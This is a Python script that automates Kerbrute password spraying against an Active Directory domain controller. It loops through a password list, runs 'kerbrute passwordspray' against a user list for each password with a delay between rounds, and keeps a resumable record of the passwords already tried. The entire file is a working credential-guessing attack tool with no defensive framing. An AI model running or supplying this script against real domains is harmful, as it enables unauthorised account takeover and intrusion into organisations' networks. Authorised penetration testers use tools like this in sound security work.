"""
Kerbrute Password Spraying Automation Script
Requirements: Kerbrute must be installed and avainable in PATH
"""

import os
import sys
import subprocess
import time
import argparse
from datetime import datetime
from pathlib import Path

def parse_arguments():
    parser = argparse.ArgumentParser(
        description='Improved password spreading using Kerbrute',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
For example:
    python3 py-kerbruter.py -u users.txt -p passwords.txt -d example.com -dc dc01.example.com -t 230
        """
    )
    
    parser.add_argument('-u', '--users', required=True, help='User list for spraying')
    parser.add_argument('-p', '--passwords', required=True, help='Password list for spraying')
    parser.add_argument('-d', '--domain', required=True, help='Domain name')
    parser.add_argument('-dc', '--dc', required=True, help='Domain Controller')
    parser.add_argument('-t', '--delay', type=int, default=155, help='Delay between spreading cycles in seconds (default: 155)')
    parser.add_argument('--kerbrute-path', default='kerbrute', help='Path to Kerbrute (default: "kerbrute")')
    
    return parser.parse_args()

def check_file_exists(file_path, description):
    """checking the existence of a file"""
    if not os.path.exists(file_path):
        print(f"[!] {description} File not found: {file_path}")
        sys.exit(1)

def read_checked_passwords(checked_file):
    """Reading verified passwords to a file"""
    checked = set()
    if os.path.exists(checked_file):
        try:
            with open(checked_file, 'r') as f:
                for line in f:
                    password = line.strip()
                    if password:
                        checked.add(password)
            print(f"[+] Uploaded {len(checked)} verified passwords from a {checked_file}")
        except Exception as e:
            print(f"[!] Reading error {checked_file}: {e}")
    return checked

def save_checked_passwords(checked_file, checked_set):
    """Save verified passwords in file"""
    try:
        with open(checked_file, 'w') as f:
            for password in sorted(checked_set):
                f.write(f"{password}\n")
        print(f"[+] Saved {len(checked_set)} verified passwords to {checked_file}")
    except Exception as e:
        print(f"[!] Error saving to {checked_file}: {e}")

def run_kerbrute_spray(kerbrute_path, domain, dc, users_file, password, output_dir):
    """Executing commands Kerbrute for a password spraying"""
    # Timestamp for the log file name
    timestamp = datetime.now().strftime("%Y_%m_%d_%H_%M_%S")
    log_file = os.path.join(output_dir, f"kerbrute_{timestamp}.log")
    
    cmd = [
        kerbrute_path,
        "passwordspray",
        "-d", domain,
        "--dc", dc,
        users_file,
        password,
        "--verbose",
        "--output", log_file
    ]
    
    print(f"[*] Starting password spraying with password: {password}")
    print(f"[*] Command: {' '.join(cmd)}")
    
    try:
        # Starting Kerbrute and recording data in real time
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        # Print to stdout in real time
        for line in process.stdout:
            print(line.strip())
        
        process.wait()
        print(f"[*] Spraying completed. Logs saved to: {log_file}")
        return True
        
    except FileNotFoundError:
        print(f"[!] Kerbrute not found on the path: {kerbrute_path}")
        print("[!] Make sure that Kerbrute is installed and the path is specified, or specify it using --kerbrute-path")
        return False
    except KeyboardInterrupt:
        print("\n[!] Spray interrupted by the user")
        return False
    except Exception as e:
        print(f"[!] Error launching Kerbrute: {e}")
        return False

def main():
    args = parse_arguments()
    
    # checking the required arguments
    check_file_exists(args.users, "User list for spraying")
    check_file_exists(args.passwords, "Password list for spraying")
    
    # Checking and creating output dir
    output_dir = "output"
    os.makedirs(output_dir, exist_ok=True)
    print(f"[+] Output directory: {output_dir}")
    
    # Availability checked file
    checked_file = "checked.txt"
    if not os.path.exists(checked_file):
        print(f"[+] Creating new {checked_file}")
        with open(checked_file, 'w') as f:
            pass
    
    # reading already verified passwords
    checked = read_checked_passwords(checked_file)
    
    # password reading and processing
    passwords_processed = 0
    passwords_skipped = 0
    passwords_to_try = 0
    
    # counting the total number of passwords
    with open(args.passwords, 'r') as f:
        for line in f:
            password = line.strip()
            if password and password not in checked:
                passwords_to_try += 1
    
    print(f"[+] Total number of passwords: {passwords_to_try}")
    print(f"[+] Delay between sprays: {args.delay} секунд")
    print("[*] Starting password spraying...")
    print("-" * 60)
    
    try:
        with open(args.passwords, 'r') as f:
            for line_num, line in enumerate(f, 1):
                password = line.strip()
                
                if not password:
                    passwords_skipped += 1
                    continue
                
                if password in checked:
                    passwords_skipped += 1
                    continue
                
                print(f"\n[+] Processing password {passwords_processed + 1}/{passwords_to_try}")
                print(f"[+] String {line_num}: '{password}'")
                
                success = run_kerbrute_spray(
                    args.kerbrute_path,
                    args.domain,
                    args.dc,
                    args.users,
                    password,
                    output_dir
                )
                
                if success:
                    # Add to checked set and save to file
                    checked.add(password)
                    save_checked_passwords(checked_file, checked)
                    passwords_processed += 1
                    
                    # delay between sprays (except for the last one)
                    if passwords_processed < passwords_to_try:
                        print(f"[*] Delay {args.delay} seconds...")
                        time.sleep(args.delay)
                else:
                    print("[!] Restart error Kerbrute, existing...")
                    break
                
    except KeyboardInterrupt:
        print("\n[!] The script was interrupted by the user")
        print(f"[+] Processed {passwords_processed} passwords")
        print(f"[+] Skipped {passwords_skipped} passwords")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        print(f"[+] Processed {passwords_processed} passwords")
        print(f"[+] Skipped {passwords_skipped} passwords")
    
    print("\n[+] Password spraying complete")
    print(f"[+] Total passwords processed: {passwords_processed}")
    print(f"[+] Total number of passwords skipped: {passwords_skipped}")

if __name__ == "__main__":
    main()
